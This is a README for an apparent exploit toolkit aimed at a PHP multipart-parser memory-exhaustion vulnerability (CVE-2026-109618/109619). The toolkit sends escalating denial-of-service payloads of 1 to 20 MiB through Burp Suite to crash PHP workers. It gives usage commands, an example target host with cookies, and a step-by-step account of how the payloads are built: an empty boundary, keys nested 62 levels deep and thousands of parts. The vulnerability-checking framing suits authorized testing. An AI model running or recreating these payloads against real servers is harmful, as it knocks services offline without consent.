# php2shell Exploit Toolkit for Burp Suite

Manual exploit toolkit for **CVE-2026-109618 / CVE-2026-109619** — PHP multipart parser memory exhaustion.

Two tools:
- **`send-via-burp-proxy.js`** — Automated scanner that reads a raw Burp request, generates payloads, and sends them through Burp's proxy (recommended)
- **`generate-payload.js`** — Generates raw HTTP request files to disk for manual use

---

## Quick Start (Recommended)

### 1. Copy a request from Burp Suite

In Burp, right-click any request to your target → **Copy to file** or **Copy as raw**. Save it as a `.txt` file:

```
GET /startup.php?env=ext-prod-sim HTTP/2
Host: setup-route.trade.tt
Cookie: DEB_ENV_EXT-UAT=ext-uat-cert; DEB_ABT_Y=1
Sec-Ch-Ua: "Not A(Brand";v="99", "Chromium";v="154"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
Accept: */*
```

### 2. Run the scanner

```bash
MSYS_NO_PATHCONV=1 node send-via-burp-proxy.js request.txt
```

That's it. The scanner will:
1. Parse the host, path, and all headers from your request
2. Send a **control request** (baseline) through Burp proxy
3. Send **probe 1** (1 MiB, 4000 parts) — if it crashes, stop
4. Send **probe 2** (8 MiB, 1020 parts) — if it crashes, stop
5. Send **probe 3** (20 MiB, 1020 parts) — if it crashes, stop
6. Report the **minimum effective probe** or NOT VULNERABLE

All requests land in **Burp HTTP History** — right-click → Send to Repeater to replay.

### 3. Example output

```
  php2shell Burp Proxy Scanner
  CVE-2026-109618 / CVE-2026-109619
  ─────────────────────────────────────────────
  Target:   https://setup-route.trade.tt/startup.php?env=ext-prod-sim
  Proxy:    127.0.0.1:8080
  Headers:  13 custom headers
  Original: GET (converted to POST for exploit)

── CONTROL ─────────────────────────────────────────
[+] Control: HTTP 200, 245909 bytes

── PROBE 1 (1 MiB / 4000 parts) ───────────────────
[+] Probe 1: HTTP 200, 245909 bytes
[-] Probe 1: no crash signal, escalating...

── PROBE 2 (8 MiB / 1020 parts) ───────────────────
[+] Probe 2: HTTP 500, 0 bytes

  ╔════════════════════════════════════════════════╗
  ║  VULNERABLE                                   ║
  ╚════════════════════════════════════════════════╝
  Host:     setup-route.trade.tt
  Probe:    #2 (8 MiB / 1020 parts)
  Signal:   HTTP 500 with empty body

  Minimum effective probe: #2 — skipping larger probes.
```

---

## Scanner CLI Options

```
node send-via-burp-proxy.js <request.txt> [options]
```

| Flag | Description | Default |
|------|-------------|---------|
| `<request.txt>` | Path to raw HTTP request file (required) | — |
| `--probe <1\|2\|3>` | Test only this specific probe (skip escalation) | auto-escalate |
| `--outdir <dir>` | Also save generated payload files to disk | — |
| `--help` | Show help | — |

### Examples

```bash
# Auto-escalate probes (recommended)
MSYS_NO_PATHCONV=1 node send-via-burp-proxy.js request.txt

# Test only probe 2 (8 MiB)
MSYS_NO_PATHCONV=1 node send-via-burp-proxy.js request.txt --probe 2

# Also save payload files to disk
MSYS_NO_PATHCONV=1 node send-via-burp-proxy.js request.txt --outdir ./payloads

# Different target — just change the request file
MSYS_NO_PATHCONV=1 node send-via-burp-proxy.js setup_int_sqe.txt
```

---

## Payload Generator (Manual)

If you prefer generating payload files to disk without sending them:

```bash
MSYS_NO_PATHCONV=1 node generate-payload.js --host example.com --path /index.php --probe all
```

| Flag | Description | Default |
|------|-------------|---------|
| `--host <host>` | Target Host header | `TARGET_HOST` |
| `--path <path>` | URL path | `/index.php` |
| `--probe <1\|2\|3\|all>` | Which probe to generate | `2` |
| `--control-only` | Only generate the control request | — |
| `--outdir <dir>` | Output directory | `./payloads` |
| `--header <K: V>` | Custom header (repeatable) | — |

---

## Probe Sizes

| Probe | Body Size | Parts | Use When |
|-------|-----------|-------|----------|
| 1 | 1 MiB | 4,000 | Smallest — most likely to pass WAFs/size limits |
| 2 | 8 MiB | 1,020 | **Recommended** — confirmed working on most targets |
| 3 | 20 MiB | 1,020 | Maximum memory pressure for hardened targets |

The scanner auto-escalates from probe 1 → 2 → 3 and stops at the first one that triggers a crash.

---

## Interpreting Results

| Probe Response | vs Control | Verdict |
|----------------|-----------|---------|
| HTTP 500, empty body | Control had content | **VULNERABLE** (mod_php or PHP-FPM) |
| HTTP 502 / 503 / 504 | Any | **VULNERABLE** (PHP-FPM worker crashed) |
| HTTP 200, empty body | Control had content | **VULNERABLE** (worker died) |
| `Allowed memory size of ... bytes exhausted` | Any | **VULNERABLE** (memory exhaustion confirmed) |
| Same status + similar body | Same | Not vulnerable or patched |
| HTTP 400 / 403 / 413 | Any | Blocked by WAF or size limit (inconclusive) |

---

## How the Exploit Works

1. **Empty boundary trick**: `Content-Type: multipart/form-data; boundary=` — PHP accepts an empty boundary, so `--` alone becomes the part delimiter

2. **Deeply nested keys**: Each part uses field name `a[][a][a][a]...[a]` with 62 nesting levels. PHP allocates memory for each level per part — thousands of parts cause exponential memory consumption

3. **Filler padding**: `x:\n` lines pad the body to the target size. PHP's multipart parser treats these as MIME headers but they don't create additional parts

4. **Memory exhaustion**: The PHP process either crashes, gets killed by the OS, or gets terminated by PHP-FPM (returning 502/503/504 through the reverse proxy)

---

## Patched PHP Versions

| Branch | Fixed In |
|--------|----------|
| PHP 8.2 | 8.2.35 |
| PHP 8.3 | 8.3.36 |
| PHP 8.4 | 8.4.27 |
| PHP 8.5 | 8.5.12 |

---

## Prerequisites

- **Node.js** (any recent version)
- **Burp Suite** with proxy listener on `127.0.0.1:8080`
- On **Git Bash (Windows)**: prefix commands with `MSYS_NO_PATHCONV=1` to prevent path mangling

---

## File Structure

```
php2shell_exploit/
├── send-via-burp-proxy.js   ← Automated scanner (recommended)
├── generate-payload.js      ← Manual payload generator
├── README.md                ← This file
├── request_trade_tt.txt     ← Example request file
└── payloads_trade_tt/       ← Generated output
    ├── control_request.txt
    ├── probe1_1mb_4000parts.bin
    ├── probe2_8mb_1020parts.bin
    └── probe3_20mb_1020parts.bin
```

---

## Tips

- **Burp must be running** on `127.0.0.1:8080` before you run the scanner
- **Large probes**: Probe 2 (8 MiB) and Probe 3 (20 MiB) take a few seconds to build and send — this is normal
- **Don't paste .bin files into Burp Repeater** — they get truncated. Use the scanner to send through the proxy, then replay from HTTP History
- **Multiple targets**: Create a separate `.txt` request file for each host and run the scanner on each
- **Timeout**: Vulnerable targets may take a while to respond. The scanner has a 90-second timeout per request
- **HTTPS only**: The scanner tunnels through Burp via HTTP CONNECT — it assumes HTTPS (port 443)
